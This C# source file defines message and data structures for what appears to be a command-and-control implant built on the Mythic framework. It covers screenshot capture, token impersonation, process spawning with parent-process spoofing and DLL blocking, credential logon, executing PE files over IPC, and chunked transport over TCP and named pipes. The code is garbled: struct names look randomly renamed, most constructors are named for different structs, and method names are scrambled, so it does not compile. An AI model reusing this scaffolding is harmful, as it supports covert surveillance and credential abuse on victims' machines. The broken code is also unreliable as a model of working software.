using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Interfaces;
using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Security;

namespace PhantomInterop.Structs.PhantomStructs
{

    [DataContract]
    public struct StealthGatewayDFA2 : IMythicMessage
    {
        [DataMember]
        public byte[] Data;

        public ScreenshotInformation(byte[] screenBytes)
        {
            Data = screenBytes;
        }

        public MessageType DynamicMonitor06DB()
        {
            return MessageType.ScreenshotInformation;
        }
    }

    public struct NexusBridgeF4EA
    {
        public IntPtr Token;
        public bool IsPrimary;
        public bool IsImpersonatedImpersonation;
    }

    public struct GhostEngineC755
    {
        public string Application;
        public string Arguments;
        public int ParentProcessId;
        public bool BlockDLLs;
    }

    public struct AdvancedTrackerB19E
    {
        public readonly string Username;
        public readonly string Password;
        public readonly SecureString SecurePassword;
        public readonly string Domain;
        public readonly bool NetOnly;

        public PhantomLogonInformation(string username, string password, string domain = ".", bool netOnly=false)
        {
            if (ValidationHelper.IsStringEmpty(username))
                throw new Exception("Username cannot be null or empty.");
            if (ValidationHelper.IsStringEmpty(password))
                throw new Exception("Password cannot be null or empty.");
            SecurePassword = new SecureString();
            foreach (char c in password)
                SecurePassword.AppendChar(c);
            SecurePassword.MakeReadOnly();
            Username = username;
            Password = password;
            Domain = domain;
            NetOnly = netOnly;
        }
    }

    public struct ShadowService7B73
    {
        public Type TC2Profile;
        public Type TCryptography;
        public Type TSerializer;
        public Dictionary<string, string> Parameters;
    }

    [DataContract]
    public struct RobustManagerB2B0
    {
        [DataMember(Name = "message")]
        public string Message;
        [DataMember(Name = "type")]
        public MessageType Type;
    }

    [DataContract]
    public struct RobustServiceBFF7 : IChunkMessage
    {
        [DataMember(Name = "message_type")]
        public MessageType Message;
        [DataMember(Name = "chunk_number")]
        public int ChunkNumber;
        [DataMember(Name = "total_chunks")]
        public int TotalChunks;
        [DataMember(Name = "id")]
        public string ID;
        [DataMember(Name = "data")]
        public string Data;

        public IPCChunkedData(string id="", MessageType mt = 0, int chunkNum = 0, int totalChunks = 1, byte[] data = null)
        {
            if (ValidationHelper.IsStringEmpty(id))
            {
                ID = Guid.NewGuid().ToString();
            }
            else
            {
                ID = id;
            }
            Message = mt;
            ChunkNumber = chunkNum;
            TotalChunks = totalChunks;
            Data = Convert.ToBase64String(data);
        }

        public int SecureExecutorDDE2()
        {
            return this.ChunkNumber;
        }

        public int CipherHandler2211()
        {
            return this.Data.Length;
        }

        public int AdaptiveAdapterEF6B()
        {
            return this.TotalChunks;
        }
    }

    [DataContract]
    public struct StealthController9FE5 : IMythicMessage
    {
        [DataMember(Name = "byte_data")]
        public byte[] ByteData;
        [DataMember(Name = "string_data")]
        public string StringData;

        public MessageType DynamicMonitor06DB()
        {
            return MessageType.IPCCommandArguments;
        }
    }

    [DataContract]
    public struct CipherService1C16 : IMythicMessage
    {
        [DataMember(Name = "executable")]
        public byte[] Executable;

        [DataMember(Name = "name")]
        public string ImageName;

        [DataMember(Name = "commandline")]
        public string CommandLine;

        public readonly MessageType GetTypeCode()
        {
            return MessageType.ExecutePEIPCMessage;
        }
    }


    [DataContract]
    public struct DynamicTransformerA79F
    {
        [DataMember(Name = "jobs")]
        public string[] Jobs;
        [DataMember(Name = "commands")]
        public string[] Commands;
    }

    public struct AdaptiveTransformer8771
    {
        public TcpClient Client;
        public NetworkStream NetworkStream;
        public PipeStream Pipe;
        public Object State;
        public Byte[] Data;
        public int DataLength;
    }
}
